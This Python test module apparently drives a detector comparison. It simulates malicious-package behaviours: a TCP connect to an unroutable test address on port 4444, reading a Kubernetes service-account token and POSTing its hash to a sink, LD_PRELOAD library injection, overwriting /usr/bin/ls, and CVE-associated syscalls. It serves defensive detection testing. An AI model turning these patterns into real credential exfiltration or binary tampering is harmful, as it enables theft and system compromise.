"""PROVBIND demo app, Tier 2 scenario behaviours (docs/COMPARISON-RUN.md §3). HARMLESS test code.

Each function re-creates the *shape* of one Datadog malicious-package behaviour so that PROVBIND's
runtime verifier, Falco, and the trace-based estimators (Confine-E, DeSFAM-E) each have something to
act on. Nothing here is an exploit, downloads or reads a real malicious sample, changes privilege,
or touches a real host: every effect happens only inside the throwaway demo container, which is torn
down after the run. app.py routes one endpoint to each function; see docs/COMPARISON-RUN.md for the
scenario id, the behaviour it stands for and the expected result per system.
"""
from __future__ import annotations

import hashlib
import os
import socket
import stat
import subprocess
import time

# The pod's own service-account token (its throwaway demo SA). Used read-only by R-U5, which never
# transmits its contents; see credential_read().
SA_TOKEN = "/var/run/secrets/kubernetes.io/serviceaccount/token"


def kernel_cve_shape() -> str:
    """R-K2 (known kernel-CVE syscall pattern, shape only). Issue the system calls the DeSFAM CVEs
    used, harmlessly, so the recorded trace carries their shape. No exploit and no privilege change:
    on a patched kernel these are ordinary calls. Confine-E blocks either call if it is outside the
    image's static list; DeSFAM-E may flag the window; PROVBIND does not watch raw syscalls."""
    made = []
    # waitid(): CVE-2017-5123 abused a waitid() bug. Spawn /bin/true and reap it with waitid().
    try:
        pid = os.posix_spawn("/bin/true", ["/bin/true"], os.environ)
        os.waitid(os.P_PID, pid, os.WEXITED)
        made.append("waitid")
    except OSError:
        pass
    # splice(): Dirty Pipe (CVE-2022-0847) moved data through a pipe with splice(). Splice a few KiB
    # from /dev/zero into a pipe and drop them: no page-cache write, nothing overwritten.
    try:
        r, w = os.pipe()
        z = os.open("/dev/zero", os.O_RDONLY)
        try:
            os.splice(z, w, 4096)
            made.append("splice")
        finally:
            os.close(z)
            os.close(r)
            os.close(w)
    except (OSError, AttributeError):
        pass
    return "+".join(made) or "none"


def preload_injection(so_path: str = "/tmp/.inj.so") -> bool:
    """R-K3 (library injection). Write the embedded harmless .so (built at image build like x9.c)
    and LD_PRELOAD it into `python3 -c pass`. The loader maps a library that is in no image layer,
    so PROVBIND reports D_load undeclared. The .so's constructor only appends an inert marker line
    and returns. Returns False (a no-op) when no .so is embedded, e.g. in the source tree."""
    try:
        from requestz_helper._payload import INJ_SO_B64
    except ImportError:
        INJ_SO_B64 = ""
    if not INJ_SO_B64:
        return False
    import base64
    with open(so_path, "wb") as f:
        f.write(base64.b64decode(INJ_SO_B64))
    os.chmod(so_path, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
    env = dict(os.environ, LD_PRELOAD=so_path)
    subprocess.run(["python3", "-c", "pass"], env=env, stdin=subprocess.DEVNULL,
                   capture_output=True, timeout=30, check=False)
    return True


def exfil_connect(host: str = "203.0.113.9", port: int = 4444) -> str:
    """R-U3 (exfiltration, the most common Datadog behaviour). Open a TCP connection to an external
    address and send nothing. 203.0.113.9 is RFC 5737 TEST-NET-3: never routed, so the connect only
    times out or is refused. It produces a connect() to an undeclared external address, so PROVBIND
    reports D_net. No data ever leaves the container."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        s.connect((host, port))
        return "connected"
    except OSError as e:
        return f"connect-failed:{e.errno}"
    finally:
        s.close()


def overwrite_binary(target: str = "/usr/bin/ls", source: str = "/bin/cat") -> str:
    """R-U4 (binary tampering). Overwrite the declared /usr/bin/ls with /bin/cat's bytes, then run
    it. Both are conforming binaries already in the image; only the ephemeral container's copy is
    changed. The overwrite is the event PROVBIND reports as D_write on a declared file (there is no
    D_hash without runtime hashing). We restore the original bytes afterwards so the pod stays usable
    across repeated runs; nothing is deleted."""
    import shutil
    real = os.path.realpath(target)     # /usr/bin/ls may be a symlink; resolve it (CLAUDE.md)
    src = os.path.realpath(source)
    backup = "/tmp/.ls.orig"
    if not os.path.exists(backup):
        shutil.copyfile(real, backup)   # keep the declared file's original bytes for restore
    shutil.copyfile(src, real)          # the D_write on the declared file
    r = subprocess.run([real], stdin=subprocess.DEVNULL, capture_output=True, timeout=10, check=False)
    shutil.copyfile(backup, real)       # restore, so ls works for later scenarios in the same pod
    return f"overwrote {real} with {src} (rc={r.returncode}), then restored it"


def credential_read(token_path: str = SA_TOKEN,
                    sink: str = "http://demo-sink.demo.svc.cluster.local:8080/telemetry") -> str:
    """R-U5 (credential theft, made privacy-preserving). Read the pod's service-account token but
    send only its SHA-256 DIGEST -- never the token -- to an ALLOWED in-cluster address (mimicry).
    This is PROVBIND's documented blind spot: a conforming file read to an allowed sink, so nothing
    fires. The secret itself is never transmitted or logged."""
    try:
        with open(token_path, "rb") as f:
            token = f.read()
    except OSError:
        return "no-token"
    digest = hashlib.sha256(token).hexdigest()
    import urllib.request
    try:
        req = urllib.request.Request(sink, data=digest.encode(), method="POST")
        urllib.request.urlopen(req, timeout=3).read()
        return f"sent digest {digest[:12]} to allowed sink"
    except OSError:
        return f"sink unreachable; digest {digest[:12]} (token not sent)"


def dns_lookups(hosts=("example.com", "example.org", "kubernetes.default.svc")) -> int:
    """B4 (benign). Ordinary DNS resolution from the app. Expected: no alert from any system."""
    n = 0
    for h in hosts:
        try:
            socket.getaddrinfo(h, 80, proto=socket.IPPROTO_TCP)
            n += 1
        except OSError:
            pass
    return n


def volume_write(base_dir: str = "/data") -> str:
    """B5 (benign). Write and read a file under a mounted emptyDir volume (in no image layer, like
    /tmp). Expected: conforming, no alert. Needs the deployment to mount a volume at base_dir."""
    os.makedirs(base_dir, exist_ok=True)
    p = os.path.join(base_dir, f"vol-{int(time.time() * 1000)}.txt")
    with open(p, "w", encoding="utf-8") as f:
        f.write("provbind benign volume write\n")
    with open(p, encoding="utf-8") as f:
        f.read()
    return p


def build_time_payload() -> str:
    """A-U2 (install-time execution). Run /usr/local/bin/helperd, a harmless program a build step
    wrote INTO the image variant (Dockerfile.au2) without recording it in provenance. It is in a
    layer, so PROVBIND raises only the weak outside_closure signal (the documented build-time limit),
    not an undeclared-exec. A no-op returning "absent" when the plain image is deployed."""
    prog = "/usr/local/bin/helperd"
    if not os.path.exists(prog):
        return "absent"
    r = subprocess.run([prog], stdin=subprocess.DEVNULL, capture_output=True, timeout=10, check=False)
    return f"ran {prog} rc={r.returncode}"
